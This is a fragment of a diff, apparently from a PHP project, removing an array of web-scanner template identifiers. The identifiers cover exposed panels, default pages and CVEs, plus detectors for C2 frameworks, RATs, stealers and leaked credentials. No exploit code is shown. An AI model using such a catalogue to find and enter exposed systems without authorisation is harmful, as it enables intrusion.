-        290 => 'ambari-exposure',
-        291 => 'amcrest-login',
-        292 => 'amp-application-panel',
-        293 => 'andover-continuum-panel',
-        294 => 'apache-drill-exposure',
-        295 => 'apache-hive-detect',
-        296 => 'apache-impala',
-        297 => 'apache-jmeter-dashboard',
-        298 => 'apache-jspwiki-detect',
-        299 => 'apache-mesos-panel',
-        300 => 'apache-tika-detect',
-        301 => 'apollo-sandbox-ui-exposed',
-        302 => 'apostrophecms-detect',
-        303 => 'metatag-cms',
-        304 => 'archibus-webcentral-panel',
-        305 => 'argilla-panel',
-        306 => 'ariang-debug-console',
-        307 => 'arize-phoenix-panel',
-        308 => 'aruba-airwave-panel',
-        309 => 'aruba-via-vpn-panel',
-        310 => 'atera-customer-portal',
-        311 => 'aveva-edge-panel',
-        312 => 'aviatrix-panel',
-        313 => 'aws-ec2-autoscale',
-        314 => 'aws-ec2-status',
-        315 => 'ec2-instance-information',
-        316 => 'aws-object-listing',
-        317 => 'aws-xray-application',
-        318 => 'default-amazon-cognito',
-        319 => 'amazon-ec2-detect',
-        320 => 'aws-cloudfront-service',
-        321 => 'aws-detect',
-        322 => 'elastic-beanstalk-detect',
-        323 => 's3-torrent',
-        324 => 'azure-instrumentation-key-exposure',
-        325 => 'azure-apim-secretkey',
-        326 => 'azure-blob-core-detect',
-        327 => 'azure-kubernetes-service',
-        328 => 'default-azure-function-app',
-        329 => 'default-microsoft-azure-page',
-        330 => 'default-page-azure-container',
-        331 => 'veeam-backup-azure-panel',
-        332 => 'balada-injector-malware',
-        333 => 'malwared-byob',
-        334 => 'basercms-install',
-        335 => 'beckhoff-twincat-hmi-panel',
-        336 => 'beyondtrust-remotesupport-panel',
-        337 => 'binom-installer',
-        338 => 'black-duck-panel',
-        339 => 'blackbox-exporter-exposure',
-        340 => 'bmc-controlm-mft-panel',
-        341 => 'bootstrap-admin-panel-template',
-        342 => 'busybox-repository-browser',
-        343 => 'campaignmonitor-takeover',
-        344 => 'chamilo-installer',
-        345 => 'changedetection-unauth',
-        346 => 'changedetection-panel',
-        347 => 'cheatsh-detect',
-        348 => 'cisco-meraki-exposure',
-        349 => 'cisco-webvpn-detect',
-        350 => 'cisco-asa-detect',
-        351 => 'cisco-systems-login',
-        352 => 'cisco-vmanage-login',
-        353 => 'cisco-webui-login',
-        354 => 'citrix-hypervisor-page',
-        355 => 'clearml-panel',
-        356 => 'cloud-metadata',
-        357 => 'json-server',
-        358 => 'cloud-run-default-page',
-        359 => 'cockpit-project-panel',
-        360 => 'codeigniter-errorpage',
-        361 => 'copa-data-zenon-panel',
-        362 => 'couchbase-sync-gateway',
-        363 => 'cpanel-api-codes',
-        364 => 'cribl-stream-panel',
-        365 => 'crypto-mining-malware',
-        366 => 'addeventlistener-detect',
-        367 => 'defaced-website-detect',
-        368 => 'dir-listing',
-        369 => 'google-floc-disabled',
-        370 => 'maxforwards-headers-detect',
-        371 => 'old-copyright',
-        372 => 'spnego-detect',
-        373 => 'x-recruiting-header',
-        374 => 'cyberchef-panel',
-        375 => 'cypress-web-config',
-        376 => 'dash-panel-detect',
-        377 => 'datadog-rum-detect',
-        378 => 'dataiku-panel',
-        379 => 'dd-wrt-controlpanel-exposure',
-        380 => 'default-cakephp-page',
-        381 => 'default-tengine-page',
-        382 => 'delinea-secret-server-panel',
-        383 => 'delphi-mvc-exception',
-        384 => 'deskpro-on-default-page',
-        385 => 'deskpro-default-page',
-        386 => 'determined-ai-panel',
-        387 => 'docmosis-tornado-server',
-        388 => 'tornado-server-login',
-        389 => 'dokploy-panel',
-        390 => 'dolibarr-panel',
-        391 => 'dozzle-container-logs',
-        392 => 'druid-console-exposure',
-        393 => 'drupal-detect',
-        394 => 'drupal-user-enum-ajax',
-        395 => 'drupal-login',
-        396 => 'dufs-detect',
-        397 => 'elasticsearch',
-        398 => 'elasticsearch-sql-client-detect',
-        399 => 'emcecom-default-login',
-        400 => 'dell-remote-web-access-panel',
-        401 => 'emoncms-panel',
-        402 => 'envoy-admin-exposure',
-        403 => 'envoy-metadata-disclosure',
-        404 => 'epson-projector-detect',
-        405 => 'everything-listing',
-        406 => 'exagrid-manager-panel',
-        407 => 'expect-ct-misconfigured',
-        408 => 'deprecated-feature-policy',
-        409 => 'exposed-file-upload-form',
-        410 => 'exposed-kafdrop',
-        411 => 'expression-engine-exception',
-        412 => 'expressionengine-detect',
-        413 => 'facefusion-panel',
-        414 => 'fastchat-panel',
-        415 => 'flarum-installer',
-        416 => 'flask-debug-toolbar',
-        417 => 'flask-detect',
-        418 => 'flask-redis-docker',
-        419 => 'fooocus-panel',
-        420 => 'forgerock-ig-panel',
-        421 => 'fortiap-panel',
-        422 => 'froxlor-management-panel',
-        423 => 'froxlor-detect',
-        424 => 'ftm-manager-panel',
-        425 => 'gitbook-detect',
-        426 => 'glpi-project_glpi',
-        427 => 'gopher-server',
-        428 => 'graphql-playground',
-        429 => 'hangfire-dashboard',
-        430 => 'hetzner-cloud-detect',
-        431 => 'homeworks-illumination',
-        432 => 'hue-personal-wireless-panel',
-        433 => 'hue-wireless-lighting',
-        434 => 'hydra-dashboard',
-        435 => 'ibarn-installer',
-        436 => 'identity-server-v3-detect',
-        437 => 'interswitch-webpay',
-        438 => 'ip-webcam',
-        439 => 'open-mjpg-streamer',
-        440 => 'iparapheur-detect',
-        441 => 'janitza-umg-panel',
-        442 => 'jboss-juddi-panel',
-        443 => 'jenkins-detect',
-        444 => 'unauthenticated-jenkins',
-        445 => 'kaco-new-energy-detect',
-        446 => 'kcfinder-exposure',
-        447 => 'knime-server-panel',
-        448 => 'kodbox-installer',
-        449 => 'koel-panel',
-        450 => 'kong-manager-exposure',
-        451 => 'kong-detect',
-        452 => 'kraken-cluster-monitoring',
-        453 => 'kubeflow-pipelines-panel',
-        454 => 'lacie-panel',
-        455 => 'landesk-csa',
-        456 => 'landesk-ma',
-        457 => 'langtrace-panel',
-        458 => 'laragon-phpinfo',
-        459 => 'lighttpd-placeholder-page',
-        460 => 'lighttpd-default',
-        461 => 'lighttpd-detect',
-        462 => 'linktap-gateway-exposure',
-        463 => 'localai-detect',
-        464 => 'locklizard-webviewer-panel',
-        465 => 'locust-exposure',
-        466 => 'lomnido-panel',
-        467 => 'lorex-panel',
-        468 => 'loxone-web-panel',
-        469 => 'loxone-panel',
-        470 => 'macos-server-panel',
-        471 => 'mag-dashboard-panel',
-        472 => 'mailhog-panel',
-        473 => 'mako-runtime-error',
-        474 => 'mappproxy-detect',
-        475 => 'marimo-panel',
-        476 => 'metaflow-ui-panel',
-        477 => 'metaview-explorer-installer',
-        478 => 'microsys-promotic-panel',
-        479 => 'mongod-exposure',
-        480 => 'mongodb-exception-page',
-        481 => 'mongodb-exposure',
-        482 => 'monsta-ftp-detect',
-        483 => 'mrtg-detect',
-        484 => 'nextcloud-detect',
-        485 => 'nextcloud-install',
-        486 => 'nginx-ui-dashboard',
-        487 => 'default-nginx-page',
-        488 => 'nginx-admin-panel',
-        489 => 'nginx-auto-installer',
-        490 => 'nginx-linux-page',
-        491 => 'nginx-opencloudos-test-page',
-        492 => 'nginx-version',
-        493 => 'node-express-status',
-        494 => 'puppet-node-manager-detect',
-        495 => 'unauthorized-puppet-node-manager',
-        496 => 'np-data-cache',
-        497 => 'nzbget-panel',
-        498 => 'ocomon-panel',
-        499 => 'one-identity-safeguard-spp-panel',
-        500 => 'oneinstack-control-center',
-        501 => 'opengear-panel',
-        502 => 'openremote-detect',
-        503 => 'oracle-httpserver12c',
-        504 => 'default-oracle-application-page',
-        505 => 'oracle-application-server-panel',
-        506 => 'oracle-atg-commerce',
-        507 => 'oracle-containers-panel',
-        508 => 'oracle-fusion-detect',
-        509 => 'oracle-people-enterprise',
-        510 => 'osisoft-pi-vision-panel',
-        511 => 'outline-panel',
-        512 => 'ovpn-config-exposed',
-        513 => 'openvpn-connect',
-        514 => 'pair-drop-panel',
-        515 => 'paystack-secret-live',
-        516 => 'php-debugbar-exposure',
-        517 => 'autoset-detect',
-        518 => 'php-detect',
-        519 => 'php-proxy-detect',
-        520 => 'php-zerodium-backdoor-rce',
-        521 => 'phpmemcached-admin-panel',
-        522 => 'phpnow-works',
-        523 => 'phppgadmin-panel',
-        524 => 'pingfederate-login-panel',
-        525 => 'postrest-api-exposure',
-        526 => 'prefect-detect',
-        527 => 'procore-panel',
-        528 => 'projectsend-login',
-        529 => 'projectsend-detect',
-        530 => 'prometheus-exporter',
-        531 => 'prometheus-pushgateway-exposed-panel',
-        532 => 'puppetboard-panel',
-        533 => 'qualys-cloud-platform-login',
-        534 => 'rancher-panel',
-        535 => 'rancher-dashboard',
-        536 => 'raygun-rum-detect',
-        537 => 'redcap-detector',
-        538 => 'reddittop-rss-xss',
-        539 => 'redis-commander-exposure',
-        540 => 'unauth-redis-insight',
-        541 => 'redis-enterprise-panel',
-        542 => 'remita-credentials',
-        543 => 'request-tracker-panel',
-        544 => 'rg-uac-panel',
-        545 => 'ruijie-password-leak',
-        546 => 'roundcube-webmail-portal',
-        547 => 'rubrik-panel',
-        548 => 'sailpoint-identityiq-panel',
-        549 => 'samsung-smarttv-debug',
-        550 => 'sap-successfactors-detect',
-        551 => 'satis-repository',
-        552 => 'scale-computing-hc3-panel',
-        553 => 'sceditor-detect',
-        554 => 'schneider-ecostruxure-building-operation-webstation-panel',
-        555 => 'scs-landfill-control',
-        556 => 'seldon-core-detect',
-        557 => 'selea-ip-camera',
-        558 => 'seq-dashboard-unauth',
-        559 => 'server-status',
-        560 => 'shiori-panel',
-        561 => 'shopify-app-installer',
-        562 => 'shopify-detect',
-        563 => 'signoz-panel',
-        564 => 'skeepers-panel',
-        565 => 'smtp-credentials-exposure',
-        566 => 'sophos-utm-panel',
-        567 => 'spark-webui-unauth',
-        568 => 'spiderfoot',
-        569 => 'splash-rendering-service',
-        570 => 'sportybet-api',
-        571 => 'springboot-whitelabel',
-        572 => 'squid-analysis-report-generator',
-        573 => 'star-network-utility',
-        574 => 'strapi-admin-installer',
-        575 => 'strapi-page',
-        576 => 'struts-debug-mode',
-        577 => 'CVE-2017-5638',
-        578 => 'CVE-2020-17530',
-        579 => 'apache-struts-showcase',
-        580 => 'struts-problem-report',
-        581 => 'superset-login',
-        582 => 'swarmui-panel',
-        583 => 'symfony-debug',
-        584 => 'default-symfony-page',
-        585 => 'syncthing-dashboard',
-        586 => 'system-properties-exposure',
-        587 => 'tasmota-config-webui',
-        588 => 'teamforge-panel',
-        589 => 'tekton-dashboard',
-        590 => 'telecontrol-server-basic-panel',
-        591 => 'theia-ide-panel',
-        592 => 'titannit-web-exposure',
-        593 => 'tools4ever-ssrpm-panel',
-        594 => 'tplink-r470t-panel',
-        595 => 'tup-openframe',
-        596 => 'twonky-server-exposure',
-        597 => 'unauth-etherpad',
-        598 => 'unauth-mercurial',
-        599 => 'unauth-xproxy-dashboard',
-        600 => 'unauth-zwave-mqtt',
-        601 => 'uni-gui-framework',
-        602 => 'usermin-panel',
-        603 => 'uvdesk-install',
-        604 => 'uvdesk-helpdesk-installer',
-        605 => 'v2924-admin-panel',
-        606 => 'v2x-control',
-        607 => 'vanna-panel',
-        608 => 'vivotex-web-console-detect',
-        609 => 'voila-panel',
-        610 => 'voipmonitor-panel',
-        611 => 'vtigercrm-detect',
-        612 => 'vugex-source-detect',
-        613 => 'weaviate-console-detect',
-        614 => 'web-suite-detect',
-        615 => 'webalizer-statistics',
-        616 => 'windows-communication-foundation-detect',
-        617 => 'woodpecker-ci-panel',
-        618 => 'yacht-panel',
-        619 => 'ymhome-detect',
-        620 => 'zebra-printer-detect',
-        621 => 'zend-server-test-page',
-        622 => 'zentral-panel',
-        623 => 'zte-panel',
-        624 => 'zyxel-firewall-panel',
-        625 => 'zyxel-router-panel',
-        626 => '1password-scim-panel',
-        627 => '3cx-installer',
-        628 => '3cx-phone-management-panel',
-        629 => '4D-detect',
-        630 => 'CVE-2011-2744',
-        631 => 'CVE-2015-4074',
-        632 => 'CVE-2018-8715',
-        633 => 'CVE-2019-5418',
-        634 => 'CVE-2020-8163',
-        635 => 'rack-mini-profiler',
-        636 => 'CVE-2019-7254',
-        637 => 'eMerge-panel',
-        638 => 'CVE-2021-24226',
-        639 => 'CVE-2021-24227',
-        640 => 'CVE-2021-32820',
-        641 => 'CVE-2021-39316',
-        642 => 'CVE-2022-33891',
-        643 => 'spark-panel',
-        644 => 'CVE-2024-31223',
-        645 => 'CVE-2026-38361',
-        646 => 'aapanel-linux-panel',
-        647 => 'acemanager-login',
-        648 => 'ackee-panel',
-        649 => 'acontent-detect',
-        650 => 'actifio-panel',
-        651 => 'activecollab-detect',
-        652 => 'activecollab-installer',
-        653 => 'activemq-panel',
-        654 => 'activepieces-panel',
-        655 => 'adapt-panel',
-        656 => 'addonfinance-portal',
-        657 => 'adguard-panel',
-        658 => 'adminset-panel',
-        659 => 'admiralcloud-detect',
-        660 => 'adobe-media-server',
-        661 => 'adonisjs-detect',
-        662 => 'aem-cms',
-        663 => 'aerocms-detect',
-        664 => 'aethra-panel',
-        665 => 'agentgpt-panel',
-        666 => 'airbyte-panel',
-        667 => 'aircube-dashboard-panel',
-        668 => 'aircube-login',
-        669 => 'akamai-bot-manager-detect',
-        670 => 'akamai-detect',
-        671 => 'akuiteo-panel',
-        672 => 'alamos-panel',
-        673 => 'alfresco-panel',
-        674 => 'allegro-rompager-panel',
-        675 => 'alternc-panel',
-        676 => 'amazon-ecs-defualt-page',
-        677 => 'ambassador-edgestack-detect',
-        678 => 'ampache-debug',
-        679 => 'ampache-panel',
-        680 => 'ampguard-wifi-setup',
-        681 => 'android-debug-database-exposed',
-        682 => 'angular-detect',
-        683 => 'ansible-tower-exposure',
-        684 => 'anythingllm-panel',
-        685 => 'apache-cloudstack-detect',
-        686 => 'apache-cocoon-detect',
-        687 => 'apache-detect',
-        688 => 'bitnami-apache-solr',
-        689 => 'default-apache2-ubuntu-page',
-        690 => 'kafka-manager-unauth',
-        691 => 'node-red-detect',
-        692 => 'apache-dubbo-detect',
-        693 => 'apache-inlong-detect',
-        694 => 'apache-ofbiz-detect',
-        695 => 'apache-pinot-detect',
-        696 => 'apache-shenyu-detect',
-        697 => 'apache-streampark-detect',
-        698 => 'apache-streampipes-detect',
-        699 => 'apache-tapestry-detect',
-        700 => 'apache-zeppelin-detect',
-        701 => 'appcms-detect',
-        702 => 'apple-cups-exposure',
-        703 => 'cups-detect',
-        704 => 'apple-httpserver',
-        705 => 'appspace-panel',
-        706 => 'aptus-panel',
-        707 => 'aqua-enterprise-panel',
-        708 => 'arcserve-panel',
-        709 => 'array-networks-ssl-vpn-panel',
-        710 => 'arthas-web-console',
-        711 => 'aspect-control-panel',
-        712 => 'aspnetmvc-version-disclosure',
-        713 => 'astrbot-panel-detect',
-        714 => 'asustor-adm-panel',
-        715 => 'asyncapi-inventory',
-        716 => 'attu-detect',
-        717 => 'milvus-detect',
-        718 => 'atvise-login',
-        719 => 'audiobookshelf-panel',
-        720 => 'authelia-panel',
-        721 => 'authentik-panel',
-        722 => 'autobahn-python-detect',
-        723 => 'automatisch-panel',
-        724 => 'avantfax-panel',
-        725 => 'avideo-detect',
-        726 => 'axel-webserver',
-        727 => 'axigen-webadmin',
-        728 => 'axigen-webmail',
-        729 => 'axway-api-manager-panel',
-        730 => 'axway-securetransport-panel',
-        731 => 'axxon-client-panel',
-        732 => 'azkaban-web-client',
-        733 => 'b2b-builder-detect',
-        734 => 'backdrop-cms-detect',
-        735 => 'baget-exposure',
-        736 => 'bamboo-detect',
-        737 => 'bedita-panel',
-        738 => 'bentoml-detect',
-        739 => 'beszel-panel',
-        740 => 'big-agi-panel',
-        741 => 'bigbluebutton-detect',
-        742 => 'bigbluebutton-login',
-        743 => 'bigcommerce-detect',
-        744 => 'bigip-detect',
-        745 => 'biotime-panel',
-        746 => 'bitbucket-panel',
-        747 => 'bitdefender-gravityzone',
-        748 => 'bitrix-detect',
-        749 => 'bitwarden-vault-panel',
-        750 => 'bizzy-panel',
-        751 => 'blogger-detect',
-        752 => 'blue-yonder-panel',
-        753 => 'boa-web-server',
-        754 => 'bonobo-server-panel',
-        755 => 'bravia-signage',
-        756 => 'browserless-debugger',
-        757 => 'bubble-detect',
-        758 => 'buddy-panel',
-        759 => 'bugzilla-detect',
-        760 => 'buildbot-panel',
-        761 => 'bulma-detect',
-        762 => 'burp-collaborator-detect',
-        763 => 'caldera-c2',
-        764 => 'caobox-cms-detect',
-        765 => 'carel-plantvisor-panel',
-        766 => 'casaos-panel',
-        767 => 'catalog-creator-detect',
-        768 => 'caton-network-manager-system',
-        769 => 'celebrus-detect',
-        770 => 'centos-eol',
-        771 => 'default-centos-test-page',
-        772 => 'chatbot-ui-panel',
-        773 => 'checkmk-login',
-        774 => 'cherrypy-detect',
-        775 => 'chevereto-detect',
-        776 => 'chirpstack-login',
-        777 => 'cisco-onprem-panel',
-        778 => 'cisco-ucs-kvm-login',
-        779 => 'cisco-unity-panel',
-        780 => 'cisco-webex-meetings-panel',
-        781 => 'citrix-honeypot-detect',
-        782 => 'cleanweb-panel',
-        783 => 'clearscada-panel',
-        784 => 'cleo-detect',
-        785 => 'cloudcenter-installer',
-        786 => 'cloudflare-access-panel',
-        787 => 'cloudflare-nginx-detect',
-        788 => 'cloudflare-speedtest',
-        789 => 'cloudlog-panel',
-        790 => 'cmseasy-crossall-sqli',
-        791 => 'cmsimple-detect',
-        792 => 'cockroachdb-detect',
-        793 => 'codesys-webvisu-panel',
-        794 => 'cogent-datahub-panel',
-        795 => 'cognita-panel',
-        796 => 'coldfusion-administrator-login',
-        797 => 'comfyui-detect',
-        798 => 'compreface-panel',
-        799 => 'concourse-ci-panel',
-        800 => 'concrete5-detect',
-        801 => 'confluence-detect',
-        802 => 'connectwise-control-detect',
-        803 => 'corebos-panel',
-        804 => 'cortex-xsoar-login',
-        805 => 'cowboy-detect',
-        806 => 'cox-business-panel',
-        807 => 'cradlepoint-gateway-panel',
-        808 => 'craft-cms-detect',
-        809 => 'craftercms-detect',
-        810 => 'crontab-ui',
-        811 => 'cryptobox-panel',
-        812 => 'csod-panel',
-        813 => 'cubebackup-setup-installer',
-        814 => 'cudatel-panel',
-        815 => 'cvat-panel',
-        816 => 'cvent-panel-detect',
-        817 => 'cvsweb-detect',
-        818 => 'cwp-webpanel',
-        819 => 'cx-cloud-login',
-        820 => 'cyberoam-firewall-panel',
-        821 => 'cyberoam-ssl-vpn-panel',
-        822 => 'cyberpanel-panel',
-        823 => 'cyberstrikeai-panel',
-        824 => 'dahua-web-panel',
-        825 => 'dataease-panel',
-        826 => 'datagerry-panel',
-        827 => 'dbgate-panel',
-        828 => 'dbt-docs-panel',
-        829 => 'ddwrt-panel',
-        830 => 'deadbolt-ransomware',
-        831 => 'dedecms-detect',
-        832 => 'deep-sea-electronics-dse855-detect',
-        833 => 'deepmail-panel',
-        834 => 'default-apache-shiro',
-        835 => 'shiro-detect',
-        836 => 'default-apache-test-all',
-        837 => 'default-apache-test-page',
-        838 => 'default-apache2-page',
-        839 => 'default-ssltls-test-page',
-        840 => 'ibm-http-server',
-        841 => 'default-asp-net-page',
-        842 => 'default-codeigniter-page',
-        843 => 'default-django-page',
-        844 => 'django-detect',
-        845 => 'default-fastcgi-page',
-        846 => 'default-fedora-page',
-        847 => 'default-glassfish-server-page',
-        848 => 'default-iis7-page',
-        849 => 'microsoft-iis-8',
-        850 => 'default-jetty-page',
-        851 => 'jetty-showcontexts-enable',
-        852 => 'default-lucee-page',
-        853 => 'lucee-detect',
-        854 => 'lucee-stack-trace',
-        855 => 'default-movable-page',
-        856 => 'default-openresty',
-        857 => 'openresty-detect',
-        858 => 'default-parallels-plesk',
-        859 => 'default-payara-server-page',
-        860 => 'payara-micro-detect',
-        861 => 'default-plesk-page',
-        862 => 'default-redhat-test-page',
-        863 => 'default-runcloud-page',
-        864 => 'default-websphere-liberty',
-        865 => 'default-windows-server-page',
-        866 => 'dell-openmanager-login',
-        867 => 'deployment-interface-exposed',
-        868 => 'dericam-login',
-        869 => 'detect-sentry',
-        870 => 'devexpress-detect',
-        871 => 'device42-panel',
-        872 => 'dify-panel',
-        873 => 'digi-router-panel',
-        874 => 'digitalrebar-login',
-        875 => 'directadmin-login-panel',
-        876 => 'directus-detect',
-        877 => 'discuz-panel',
-        878 => 'dizquetv-detect',
-        879 => 'docebo-elearning-panel',
-        880 => 'docker-registry-browser-detect',
-        881 => 'dockge-panel',
-        882 => 'dqs-superadmin-panel',
-        883 => 'dragonfly-panel',
-        884 => 'drawio-flowchartmaker-panel',
-        885 => 'dreambox-detect',
-        886 => 'dynamic-container-host',
-        887 => 'dynatrace-login',
-        888 => 'dzzoffice-panel',
-        889 => 'earcu-panel',
-        890 => 'easydiffusion-panel',
-        891 => 'easyscripts-installer',
-        892 => 'ecessa-panel',
-        893 => 'echelon-ilon-smartserver-panel',
-        894 => 'eclipse-birt-panel',
-        895 => 'ecology-detect',
-        896 => 'edgeos-login',
-        897 => 'efak-login-panel',
-        898 => 'ejbca-enterprise-installer',
-        899 => 'ekare-insight-panel',
-        900 => 'eko-software-update-panel',
-        901 => 'ektron-cms-panel',
-        902 => 'elfinder-detect',
-        903 => 'elfiq-panel',
-        904 => 'emby-panel',
-        905 => 'emerson-intellislot-webcard',
-        906 => 'emerson-power-panel',
-        907 => 'empirecms-detect',
-        908 => 'emqx-panel',
-        909 => 'endian-firewall-panel',
-        910 => 'endpoint-protector-panel',
-        911 => 'eos-http-browser',
-        912 => 'erxes-detect',
-        913 => 'esphome-dashboard',
-        914 => 'unauth-esphome',
-        915 => 'espocrm-detect',
-        916 => 'event-debug-server-status',
-        917 => 'eventum-panel',
-        918 => 'evidently-ai-panel',
-        919 => 'evlink-panel',
-        920 => 'evse-web-panel',
-        921 => 'exposed-kibana',
-        922 => 'kibana-panel',
-        923 => 'exposed-mcp-sse-server',
-        924 => 'exposed-sqlite-manager',
-        925 => 'ez-publish-panel',
-        926 => 'f-secure-policy-manager',
-        927 => 'fanruanoa2012-detect',
-        928 => 'faraday-login',
-        929 => 'fastgpt-panel',
-        930 => 'fastly-debug-headers',
-        931 => 'filegator-panel',
-        932 => 'firemon-asset-manager-panel',
-        933 => 'firstpromoter-detect',
-        934 => 'flink-exposure',
-        935 => 'flip-cms-panel',
-        936 => 'flock-safety-camera-panel',
-        937 => 'flowci-panel',
-        938 => 'flowise-panel',
-        939 => 'flowweb-detect',
-        940 => 'flureedb-admin-console',
-        941 => 'forcepoint-applicance',
-        942 => 'forgejo-installer',
-        943 => 'fortinet-fortianalyzer-panel',
-        944 => 'fortinet-fortiddos-panel',
-        945 => 'fortinet-fortigate-panel',
-        946 => 'fortinet-fortisandbox-panel',
-        947 => 'fortinet-panel',
-        948 => 'fossbilling-panel',
-        949 => 'frappe-framework-detect',
-        950 => 'freeipa-panel',
-        951 => 'freshrss-panel',
-        952 => 'friendica-panel',
-        953 => 'fronius-datalogger-web-panel',
-        954 => 'fronius-inverter-panel',
-        955 => 'fusionauth-admin-panel',
-        956 => 'fuxa-scada-panel',
-        957 => 'gabia-server-detect',
-        958 => 'ganglia-cluster-dashboard',
-        959 => 'ge-proficy-webspace-panel',
-        960 => 'gemweb-plus-panel',
-        961 => 'geo-webserver-detect',
-        962 => 'gerapy-detect',
-        963 => 'getsimple-cms-detect',
-        964 => 'gilacms-detect',
-        965 => 'git-web-interface',
-        966 => 'gitblit-panel',
-        967 => 'github-debug',
-        968 => 'gitlist-disclosure',
-        969 => 'gocron-panel',
-        970 => 'goliath-detect',
-        971 => 'google-bucket-service',
-        972 => 'google-calendar-exposure',
-        973 => 'google-frontend-httpserver',
-        974 => 'gotify-panel',
-        975 => 'gotweb-detect',
-        976 => 'gradio-detect',
-        977 => 'gradle-cache-node-detect',
-        978 => 'gradle-develocity-panel',
-        979 => 'gradle-enterprise-panel',
-        980 => 'grandstream-device-configuration',
-        981 => 'graphiql-detect',
-        982 => 'graphiql-exposure',
-        983 => 'graphite-browser',
-        984 => 'grav-cms-detect',
-        985 => 'greenbone-panel',
-        986 => 'growatt-shinelink-panel',
-        987 => 'gstorage-detect',
-        988 => 'gunicorn-detect',
-        989 => 'gyra-master-admin',
-        990 => 'h2o-wave-panel',
-        991 => 'hack5-cloud-c2',
-        992 => 'pupyc2',
-        993 => 'supershell-c2',
-        994 => 'haivision-gateway-panel',
-        995 => 'haivision-media-platform-panel',
-        996 => 'hanwang-detect',
-        997 => 'hashicorp-boundary-detect',
-        998 => 'headscale-panel',
-        999 => 'hedgedoc-detect',
-        1000 => 'helicone-panel',
-        1001 => 'helm-dashboard-exposure',
-        1002 => 'hillstone-ssl-vpn-panel',
-        1003 => 'homarr-panel',
-        1004 => 'home-assistant-panel',
-        1005 => 'homematic-panel',
-        1006 => 'honeypot-detect',
-        1007 => 'honeywell-building-control',
-        1008 => 'hookbot-rat',
-        1009 => 'mystic-stealer',
-        1010 => 'hoppscotch-panel',
-        1011 => 'hp-blade-system',
-        1012 => 'hp-media-vault-detect',
-        1013 => 'hpe-officeconnect-panel',
-        1014 => 'hp-color-laserjet-detect',
-        1015 => 'hpe-oneview-panel',
-        1016 => 'httpbin-panel',
-        1017 => 'huawei-hg532e-panel',
-        1018 => 'huawei-home-gateway',
-        1019 => 'hubble-detect',
-        1020 => 'hugegraph-detect',
-        1021 => 'hugegraph-studio-detect',
-        1022 => 'hugo-detect',
-        1023 => 'hyperplanning-panel',
-        1024 => 'i-librarian-panel',
-        1025 => 'ibm-note-login',
-        1026 => 'ibm-odm-detect',
-        1027 => 'ibm-security-access-manager',
-        1028 => 'ibm-sterling-detect',
-        1029 => 'icecast-server-detect',
-        1030 => 'ictbroadcast-panel',
-        1031 => 'identity-services-engine',
-        1032 => 'identityguard-selfservice-entrust',
-        1033 => 'ids-skills-installer',
-        1034 => 'imgproxy-detect',
-        1035 => 'impresscms-detect',
-        1036 => 'incapptic-connect-panel',
-        1037 => 'inductive-automation-ignition-panel',
-        1038 => 'inertiajs-detect',
-        1039 => 'influxdb-panel',
-        1040 => 'influxdb-version-detect',
-        1041 => 'intel-amt-detect',
-        1042 => 'intelbras-panel',
-        1043 => 'intelliflash-login-panel',
-        1044 => 'intercom',
-        1045 => 'ipdiva-mediation-panel',
-        1046 => 'iplanet-web-server',
-        1047 => 'ipswitch-imail-detect',
-        1048 => 'ispyconnect-detect',
-        1049 => 'issabel-login',
-        1050 => 'istat-panel-detect',
-        1051 => 'ivanti-connect-secure-panel',
-        1052 => 'ivanti-csa-panel',
-        1053 => 'ivanti-endpoint-manager',
-        1054 => 'ixbusweb-panel',
-        1055 => 'jalios-jcms-panel',
-        1056 => 'jamf-panel',
-        1057 => 'jamf-login',
-        1058 => 'jboss-detect',
-        1059 => 'jboss-soa-platform',
-        1060 => 'jedox-web-panel',
-        1061 => 'jeecg-boot-detect',
-        1062 => 'jellyseerr-login-panel',
-        1063 => 'jfa-go-installer',
-        1064 => 'jhipster-detect',
-        1065 => 'jira-setup',
-        1066 => 'jitsi-meet-detect',
-        1067 => 'jorani-panel',
-        1068 => 'jsf-detect',
-        1069 => 'jspxcms-detect',
-        1070 => 'juniper-panel',
-        1071 => 'jupyter-notebooks-exposed',
-        1072 => 'kafka-topics-ui',
-        1073 => 'kanboard-login',
-        1074 => 'kaseya-vsa-login-panel',
-        1075 => 'kemp-loadmaster-panel',
-        1076 => 'kettle-default-login',
-        1077 => 'kettle-panel',
-        1078 => 'keycloak-admin-panel',
-        1079 => 'khoj-detect',
-        1080 => 'kingsoft-webserver-detect',
-        1081 => 'koboldai-panel',
-        1082 => 'kodexplorer-detect',
-        1083 => 'konga-panel',
-        1084 => 'kubelet-metrics',
-        1085 => 'kubernetes-operational-view-detect',
-        1086 => 'kubernetes-mirantis',
-        1087 => 'kubeview-dashboard',
-        1088 => 'kyocera-printer-panel',
-        1089 => 'lancom-router-panel',
-        1090 => 'langflow-detect',
-        1091 => 'langfuse-panel',
-        1092 => 'langsmith-panel',
-        1093 => 'laravel-debug-error',
-        1094 => 'lenovo-fp-panel',
-        1095 => 'lenovo-thinkserver-panel',
-        1096 => 'leostream-panel',
-        1097 => 'letta-panel',
-        1098 => 'lidarr-dashboard-unauth',
-        1099 => 'liferay-portal',
-        1100 => 'limesurvey-detect',
-        1101 => 'linkerd-badrule-detect',
-        1102 => 'linkerd-service-detect',
-        1103 => 'linksys-wifi-login',
-        1104 => 'linkwarden-panel',
-        1105 => 'linshare-panel',
-        1106 => 'linux-lfi-fuzzing',
-        1107 => 'litellm-swagger-detect',
-        1108 => 'livehelperchat-detect',
-        1109 => 'livewire-detect',
-        1110 => 'lmstudio-panel',
-        1111 => 'localgpt-panel',
-        1112 => 'logrocket-rum-detect',
-        1113 => 'lollms-webui-detect',
-        1114 => 'lottie-backdoor',
-        1115 => 'polyfill-backdoor',
-        1116 => 'lua-runtime-error',
-        1117 => 'lucy-admin-panel',
-        1118 => 'm-bus-panel',
-        1119 => 'machform-admin-panel',
-        1120 => 'mageai-panel',
-        1121 => 'magento-detect',
-        1122 => 'magento-eol',
-        1123 => 'maltrail-panel',
-        1124 => 'manageengine-adaudit',
-        1125 => 'manageengine-assetexplorer',
-        1126 => 'manageengine-servicedesk',
-        1127 => 'manageengine-supportcenter',
-        1128 => 'marqo-detect',
-        1129 => 'materialize-css-detect',
-        1130 => 'maxkb-panel',
-        1131 => 'meilisearch-detect',
-        1132 => 'memos-panel',
-        1133 => 'meshcentral-login',
-        1134 => 'meteor-takeover',
-        1135 => 'metube-detect',
-        1136 => 'mezzanine-cms-detect',
-        1137 => 'mfiles-web-detect',
-        1138 => 'microfocus-admin-server',
-        1139 => 'microsoft-iis-version',
-        1140 => 'ms-adcs-detect',
-        1141 => 'microsoft-sharepoint-detect',
-        1142 => 'mikrotik-httpproxy',
